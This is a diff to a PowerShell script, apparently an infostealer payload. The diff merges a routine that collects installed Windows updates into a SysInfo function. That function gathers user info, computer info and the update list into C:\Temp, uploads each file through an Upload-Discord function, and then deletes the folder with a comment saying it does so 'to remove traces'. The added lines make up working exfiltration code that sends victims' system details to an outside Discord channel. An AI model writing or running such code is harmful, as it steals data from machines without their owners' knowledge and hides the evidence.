@@ -10,27 +10,6 @@ function Get-Nirsoft {
 
 }
 
-function UpdatesList {
-cd C:\
-mkdir \temp
-cd \temp
-$userDir = "C:\Temp"
-$fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
-$date = Get-Date
-$Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
-
-$UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
-foreach ($Update in $UpdatesInfo) {
-    $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
-}
-
-$Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8
-
-
-Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
-#Removing every file to remove traces
-#rmdir -R \temp
-}
 function SysInfo {
 #Making sure that my path is on C:\ and creating a \temp folder, then go inside that folder to execute everything
 cd C:\
@@ -54,9 +33,23 @@ $computerInfo = Get-ComputerInfo | Out-String
 #Get info and then store it to the file
 Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8
 
+#3. Generating a report of updates installed on the computer
+$userDir = "C:\Temp"
+$fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
+$date = Get-Date
+$Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
+
+$UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
+foreach ($Update in $UpdatesInfo) {
+    $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
+}
+
+$Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8
+
 #Upload files to Discord via the Upload-Discord function
 Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
 Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
+Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
 
 #Removing every file to remove traces
 rmdir -R \temp
